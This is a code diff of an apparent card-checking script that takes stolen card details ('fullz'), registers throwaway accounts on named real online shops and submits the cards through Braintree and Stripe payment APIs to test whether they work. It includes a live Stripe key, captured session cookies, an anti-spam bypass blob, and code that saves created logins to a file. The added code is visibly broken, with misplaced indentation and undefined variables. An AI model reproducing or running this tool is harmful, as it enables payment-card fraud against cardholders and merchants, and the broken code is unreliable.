@@ -34,230 +34,169 @@ async def create_braintree_auth(fullz , session):
         cc, mes, ano, cvv = fullz.split("|")
 
 
-        mail= "criehs4d"+str(random.randint(584, 5658))+"@gamil.com"
-        user= "criehs4d"+str(random.randint(584, 5658))
+        session = requests.Session()
+        email = generate_random_email()
+        headers = {
+    'authority': 'www.thetravelinstitute.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+# 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2F; _gcl_au=1.1.1622826255.1731751749; _ga=GA1.1.1270770700.1731751749; __stripe_mid=35b8babe-ae46-4c49-852c-1c7292bd93006e66f3; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; mailchimp.cart.current_email=rokynoa00077@gmail.com; mailchimp_user_email=rokynoa00077%40gmail.com; wordpress_test_cookie=WP%20Cookie%20check; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fregister%2F; _ga_P0SVN1N4VZ=GS1.1.1731838417.2.1.1731839322.43.0.0',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+}
 
-        # url = "thebraincandypodcast.com"
-        # url = "www.weddingtropics.com"
-        # url = "www.naturaw.co.uk"
-        # url = "christianapostles.com"
-        # url = "christianapostles.com"
-        # url = "ce4less.com"
-        url = "medicalmonks.com"
+        response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
+        html=(response.text)
+        soup = BeautifulSoup(html, 'html.parser')
+        nonce = soup.find('input', {'id': 'afurd_field_nonce'})['value']
+        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})['value']
+        headers = {
+    'authority': 'www.thetravelinstitute.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'content-type': 'application/x-www-form-urlencoded',
+    # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2F; _gcl_au=1.1.1622826255.1731751749; _ga=GA1.1.1270770700.1731751749; __stripe_mid=35b8babe-ae46-4c49-852c-1c7292bd93006e66f3; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; wordpress_test_cookie=WP%20Cookie%20check; _ga_P0SVN1N4VZ=GS1.1.1731838417.2.1.1731840062.56.0.0; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fregister%2F; mailchimp.cart.previous_email=rokynoa00077@gmail.com; mailchimp.cart.current_email=rokynoa70@gmail.com; mailchimp_user_previous_email=rokynoa70%40gmail.com; mailchimp_user_email=rokynoa70%40gmail.com',
+    'origin': 'https://www.thetravelinstitute.com',
+    'referer': 'https://www.thetravelinstitute.com/register/',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+}
+        data = [
+    ('afurd_field_nonce', f'{nonce}'),
+    ('_wp_http_referer', '/register/'),
+    ('pre_page', ''),
+    ('email', f'{email}'),
+    ('password', 'Esahatam2009@'),
+    ('wc_order_attribution_source_type', 'typein'),
+    ('wc_order_attribution_referrer', 'https://www.thetravelinstitute.com/my-account/payment-methods/'),
+    ('wc_order_attribution_utm_campaign', '(none)'),
+    ('wc_order_attribution_utm_source', '(direct)'),
+    ('wc_order_attribution_utm_medium', '(none)'),
+    ('wc_order_attribution_utm_content', '(none)'),
+    ('wc_order_attribution_utm_id', '(none)'),
+    ('wc_order_attribution_utm_term', '(none)'),
+    ('wc_order_attribution_utm_source_platform', '(none)'),
+    ('wc_order_attribution_utm_creative_format', '(none)'),
+    ('wc_order_attribution_utm_marketing_tactic', '(none)'),
+    ('wc_order_attribution_session_entry', 'https://www.thetravelinstitute.com/my-account/add-payment-method/'),
+    ('wc_order_attribution_session_start_time', '2024-11-17 09:43:38'),
+    ('wc_order_attribution_session_pages', '8'),
+    ('wc_order_attribution_session_count', '1'),
+    ('wc_order_attribution_user_agent', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'),
+    ('woocommerce-register-nonce', f'{noncee}'),
+    ('_wp_http_referer', '/register/'),
+    ('register', 'Register'),
+]
 
+        response = session.post('https://www.thetravelinstitute.com/register/', headers=headers, data=data,timeout=20)
+        if response.status_code == 200:
+            with open('Creds.txt','a') as f:
+                f.write(email+':'+'Esahatam2009@')
+                        return session
+        else:
+            
+            return None
+        def generate_random_email(length=8, domain=None):
+    common_domains = ["gmail.com"]
+    if not domain:
+        domain = random.choice(common_domains)
+   
+    username_characters = string.ascii_letters + string.digits
+    username = ''.join(random.choice(username_characters) for _ in range(length))
+    
+    return f"{username}@{domain}"
 
+        headers = {
+    'authority': 'www.thetravelinstitute.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2F; _gcl_au=1.1.1622826255.1731751749; _ga=GA1.1.1270770700.1731751749; __stripe_mid=35b8babe-ae46-4c49-852c-1c7292bd93006e66f3; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; wordpress_test_cookie=WP%20Cookie%20check; mailchimp.cart.previous_email=jskdkkf@gmail.com; mailchimp.cart.current_email=rokynoa770@gmail.com; mailchimp_user_previous_email=rokynoa770%40gmail.com; mailchimp_user_email=rokynoa770%40gmail.com; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=rokynoa770%7C1732014706%7CnlixooWRVSegJrJXNcrUsmJaqDN6dbCvUOlUzcgbKUQ%7C121ace480380dc0d60c31096a81844176747e4861cb68812b5fb36a5475be6e4; _ga_P0SVN1N4VZ=GS1.1.1731838417.2.1.1731841943.27.0.0; sbjs_session=pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; __stripe_sid=91fee077-415f-484a-b11c-a224a6d470c6cd06bc',
+    'referer': 'https://www.thetravelinstitute.com/my-account/payment-methods/',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+}
 
-        # url = "digicel.net"
-        # print(url)
- 
+            response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', headers=headers,timeout=20)
+            html=(response.text)
+            nonce = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html).group(1)
 
-        response = await session.get(f'https://{url}/my-account/')
-        response = await session.get(f'https://{url}/my-account/')
+            headers = {
+    'authority': 'api.stripe.com',
+    'accept': 'application/json',
+    'accept-language': 'en-US,en;q=0.9',
+    'content-type': 'application/x-www-form-urlencoded',
+    'origin': 'https://js.stripe.com',
+    'referer': 'https://js.stripe.com/',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-site',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+}
 
+            data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
+            response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data,timeout=20)
+            res = (response.text)
 
-        rnonce = gets(response.text, '"woocommerce-register-nonce" value="', '"')
+       else:
+                iddd = (response.json()['id'])
+            headers = {
+    'authority': 'www.thetravelinstitute.com',
+    'accept': '*/*',
+    'accept-language': 'en-US,en;q=0.9',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2F; _gcl_au=1.1.1622826255.1731751749; _ga=GA1.1.1270770700.1731751749; __stripe_mid=35b8babe-ae46-4c49-852c-1c7292bd93006e66f3; mailchimp_user_previous_email=rokynoa770%40gmail.com; mailchimp_user_email=rokynoa770%40gmail.com; __stripe_sid=91fee077-415f-484a-b11c-a224a6d470c6cd06bc; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-17%2010%3A51%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-17%2010%3A51%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; mailchimp.cart.current_email=rokynoa770@gmail.com; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=rokynoa770%7C1732015295%7Cm1Er1NFmC7q4NvE74vQ7Snt7F9RHgF4qOG0CT9cimNP%7Cd8bc8e35ada5fed2b938c6d5861f6bf604336db01506ddb5de23e0f5bf698a1f; sbjs_session=pgs%3D21%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F; _ga_P0SVN1N4VZ=GS1.1.1731838417.2.1.1731842574.60.0.0',
+    'origin': 'https://www.thetravelinstitute.com',
+    'referer': 'https://www.thetravelinstitute.com/my-account/add-payment-method/',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    'x-requested-with': 'XMLHttpRequest',
+}
 
-        c = "apbct_visible_fields=eyIwIjp7InZpc2libGVfZmllbGRzIjoiZW1haWwiLCJ2aXNpYmxlX2ZpZWxkc19jb3VudCI6MSwiaW52aXNpYmxlX2ZpZWxkcyI6Indvb2NvbW1lcmNlLXJlZ2lzdGVyLW5vbmNlIF93cF9odHRwX3JlZmVyZXIgY3Rfbm9fY29va2llX2hpZGRlbl9maWVsZCIsImludmlzaWJsZV9maWVsZHNfY291bnQiOjN9fQ%3D%3D&ct_no_cookie_hidden_field=_ct_no_cookie_data_eyJhcGJjdF90aW1lc3RhbXAiOiIxNjk3ODM1MjQ3IiwiY3RfbW91c2VfbW92ZWQiOnRydWUsImFwYmN0X3VybHMiOiJ7XCJkaWdpY2VsLm5ldC9teS1hY2NvdW50L1wiOlsxNjk3ODM1MjQ3XX0iLCJjdF9oYXNfc2Nyb2xsZWQiOnRydWUsImN0X2NoZWNrZWRfZW1haWxzIjoiMCIsImN0X3BzX3RpbWVzdGFtcCI6IjE2OTc4MzUyNDciLCJjdF9jb29raWVzX3R5cGUiOiJub25lIiwiYXBiY3RfaGVhZGxlc3MiOiJmYWxzZSIsImN0X2hhc19rZXlfdXAiOiJ0cnVlIiwiYXBiY3RfcGFnZV9oaXRzIjoxLCJhcGJjdF92aXNpYmxlX2ZpZWxkcyI6IiU3QiUyMnZpc2libGVfZmllbGRzJTIyJTNBJTIyZW1haWwlMjIlMkMlMjJ2aXNpYmxlX2ZpZWxkc19jb3VudCUyMiUzQTElMkMlMjJpbnZpc2libGVfZmllbGRzJTIyJTNBJTIyd29vY29tbWVyY2UtcmVnaXN0ZXItbm9uY2UlMjBfd3BfaHR0cF9yZWZlcmVyJTIwYXBiY3RfdmlzaWJsZV9maWVsZHMlMjBjdF9ub19jb29raWVfaGlkZGVuX2ZpZWxkJTIyJTJDJTIyaW52aXNpYmxlX2ZpZWxkc19jb3VudCUyMiUzQTQlN0QiLCJhcGJjdF9zaXRlX2xhbmRpbmdfdHMiOiIxNjk3ODM1MjQ3IiwiYXBiY3RfY29va2llc190ZXN0IjoiJTdCJTIyY29va2llc19uYW1lcyUyMiUzQSU1QiUyMmFwYmN0X3RpbWVzdGFtcCUyMiUyQyUyMmFwYmN0X3NpdGVfbGFuZGluZ190cyUyMiU1RCUyQyUyMmNoZWNrX3ZhbHVlJTIyJTNBJTIyZTNiODE3N2ExY2E3NGNmYzYwOTAzZGUwYTk3MmJjZTklMjIlN0QiLCJjdF9oYXNfaW5wdXRfZm9jdXNlZCI6InRydWUiLCJjdF9ma3BfdGltZXN0YW1wIjoiMTY5NzgzNTI1OCIsImN0X3BvaW50ZXJfZGF0YSI6IiU1QiU1QjQwOCUyQzE2MCUyQzEyMzAzJTVEJTVEIiwiY3Rfc2NyZWVuX2luZm8iOiIlN0IlMjJmdWxsV2lkdGglMjIlM0EzNjAlMkMlMjJmdWxsSGVpZ2h0JTIyJTNBMjY0NCUyQyUyMnZpc2libGVXaWR0aCUyMiUzQTM2MCUyQyUyMnZpc2libGVIZWlnaHQlMjIlM0E2MjElN0QiLCJjdF9jaGVja2pzIjoiMTg5OTUxOTIwNCIsImN0X3RpbWV6b25lIjoiLTUiLCJhcGJjdF9waXhlbF91cmwiOiJodHRwcyUzQSUyRiUyRm1vZGVyYXRlMS12NC5jbGVhbnRhbGsub3JnJTJGcGl4ZWwlMkY1NjBiMzYyOTliYTNhYzI1OTNkZjZhYjA1OGZkOGMyYi5naWYiLCJhcGJjdF9zZXNzaW9uX2lkIjoiZ2JjcWl4IiwiYXBiY3Rfc2Vzc2lvbl9jdXJyZW50X3BhZ2UiOiJodHRwczovL2RpZ2ljZWwubmV0L215LWFjY291bnQvIiwidHlwbyI6W119"
+            params = {
+    'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
+}
 
+            data = {
+    'action': 'create_and_confirm_setup_intent',
+    'wc-stripe-payment-method': iddd,
+    'wc-stripe-payment-type': 'card',
+    '_ajax_nonce': nonce,
+            }
 
-        print(rnonce)
-
-     
-        # params = {
-        #     'action': 'register',
-        # }
-
-        data = {
-            'username': f'{user}',
-            'email': f'{mail}',
-            'password': 'ZeqWwhggxkgsP4p',
-            'email_2': '',
-            'wc_order_attribution_source_type': 'typein',
-            'wc_order_attribution_referrer': f'https://{url}/',
-            'wc_order_attribution_utm_campaign': '(none)',
-            'wc_order_attribution_utm_source': '(direct)',
-            'wc_order_attribution_utm_medium': '(none)',
-            'wc_order_attribution_utm_content': '(none)',
-            'wc_order_attribution_utm_id': '(none)',
-            'wc_order_attribution_utm_term': '(none)',
-            'wc_order_attribution_session_entry': f'https://{url}/my-account/?action=register',
-            'wc_order_attribution_session_start_time': '2024-06-13 07:13:30',
-            'wc_order_attribution_session_pages': '1',
-            'wc_order_attribution_session_count': '1',
-            'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
-            'metorik_source_type': 'typein',
-            'metorik_source_url': f'https://{url}/',
-            'metorik_source_mtke': '',
-            'metorik_source_utm_campaign': '(none)',
-            'metorik_source_utm_source': '(direct)',
-            'metorik_source_utm_medium': '(none)',
-            'metorik_source_utm_content': '(none)',
-            'metorik_source_utm_id': '(none)',
-            'metorik_source_utm_term': '(none)',
-            'metorik_source_session_entry': f'https://{url}/my-account/?action=register',
-            'metorik_source_session_start_time': '2024-06-13 07:13:30',
-            'metorik_source_session_pages': '2',
-            'metorik_source_session_count': '1',
-            'woocommerce-register-nonce': rnonce,
-            '_wp_http_referer': '/my-account/?action=register',
-            'register': 'Register',
-        }
-
-        # response = await session.post(f'https://{url}/my-account/', params=params, data=data)
-        response = await session.post(f'https://{url}/my-account/', data=data)
-
-        head3 = {
-            "Host": f"{url}",
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
-            "referer": f"https://{url}/my-account/edit-address/",
-        }
-
-        r3 = await session.get(
-            f"https://{url}/my-account/edit-address/billing/",
-            headers=head3,
-        )
-        anonce = gets(r3.text, '"woocommerce-edit-address-nonce" value="', '"')
-
-        # print(anonce)
-
-
-        post4 = f"billing_first_name=Sachio&billing_last_name=YT&billing_company=YT&billing_country=US&billing_address_1=118+W+132nd+St&billing_address_2=&billing_city=New+York&billing_state=NY&billing_postcode=10027&billing_phone=19006318646&billing_email={mail}&save_address=Save+address&woocommerce-edit-address-nonce={anonce}&_wp_http_referer=%2Fmy-account%2Fedit-address%2Fbilling%2F&action=edit_address&{c}"
-
-        head4 = {
-            "Host": f"{url}",
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
-            "content-type": "application/x-www-form-urlencoded",
-            "origin": f"https://{url}",
-            "referer": f"https://{url}/my-account/edit-address/billing/",
-        }
-
-        r4 = await session.post(
-            f"https://{url}/my-account/edit-address/billing/",
-            headers=head4,
-            data=post4,
-        )
-
-        r5 = await session.get(
-            f"https://{url}/my-account/payment-methods/",
-            headers=head4,
-        )
-
-
-
-        cnonce = gets(r5.text, '"client_token_nonce":"', '"')
-
-        # print(cnonce)
-
-        head6 = {
-            "Host": f"{url}",
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
-            "content-type": "application/x-www-form-urlencoded",
-            "origin": f"https://{url}",
-            "referer": f"https://{url}/my-account/payment-methods/",
-        }
-
-
-        r6 = await session.get(
-            f"https://{url}/my-account/add-payment-method/",
-        )
-        # print(r5.text)
-
-
-
-        # print(r6.text)
-        wnonce = gets(r6.text, '"woocommerce-add-payment-method-nonce" value="', '"')
-
-
-        # print(wnonce)
-
-
-
-
-
-        post7 = f"action=wc_braintree_credit_card_get_client_token&nonce={cnonce}"
-
-        r7 = await session.post(
-            f"https://{url}/wp-admin/admin-ajax.php",
-            headers=head6,
-            data=post7,
-        )
-        ey = gets(r7.text, '"data":"', '"')
-        be_1 = base64.b64decode(ey).decode("utf-8")
-        be = gets(be_1, '"authorizationFingerprint":"', '"')
-
-        # print(be)
-
-        head8 = {
-            "Host": "payments.braintree-api.com",
-            "content-type": "application/json",
-            "authorization": f"Bearer {be}",
-            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
-            "braintree-version": "2018-05-10",
-            "accept": "*/*",
-            "origin": "https://assets.braintreegateway.com",
-            "referer": "https://assets.braintreegateway.com/",
-        }
-
-        post8 = {
-            "clientSdkMetadata": {
-                "source": "client",
-                "integration": "dropin2",
-                "sessionId": "2eb8e620-9b4b-42d5-be2f-c3249ec470aa",
-            },
-            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
-            "variables": {
-                "input": {
-                    "creditCard": {
-                        "number": f"{cc}",
-                        "expirationMonth": f"{mes}",
-                        "expirationYear": f"{ano}",
-                        "cvv": f"{cvv}",
-                        "cardholderName": "Sachio YT",
-                        "billingAddress": {"postalCode": "10027"},
-                    },
-                    "options": {"validate": False},
-                }
-            },
-            "operationName": "TokenizeCreditCard",
-        }
-
-        r8 = await session.post(
-            "https://payments.braintree-api.com/graphql",
-            headers=head8,
-            json=post8,
-        )
-        tok = gets(r8.text, '"token":"', '"')
-        brand_ = gets(r8.text, '"brandCode":"', '"').lower()
-
-
-        # print(tok)
-        # print(brand_)
-
-        head9 = {
-            "Host": f"{url}",
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
-            "content-type": "application/x-www-form-urlencoded",
-            "origin": f"https://{url}",
-            "referer": f"https://{url}/my-account/add-payment-method/",
-        }
-
-        post9 = f"payment_method=braintree_credit_card&wc-braintree-credit-card-card-type={brand_}&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=0.00&wc_braintree_credit_card_payment_nonce={tok}&wc_braintree_device_data=&wc-braintree-credit-card-tokenize-payment-method=true&woocommerce-add-payment-method-nonce={wnonce}&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1&{c}"
-
-        response = await session.post(
-            f"https://{url}/my-account/add-payment-method/",
-            headers=head9,
-            data=post9,
-        )
-
-        # response = await session.post(
-        #     f"https://{url}/my-account/add-payment-method/",
-        #     headers=head9,
-        # )
-
+            
+        response = session.post('https://www.thetravelinstitute.com/', params=params, headers=headers, data=data,timeout=20)
+            res = (response.json())
 
 
         response=response.text
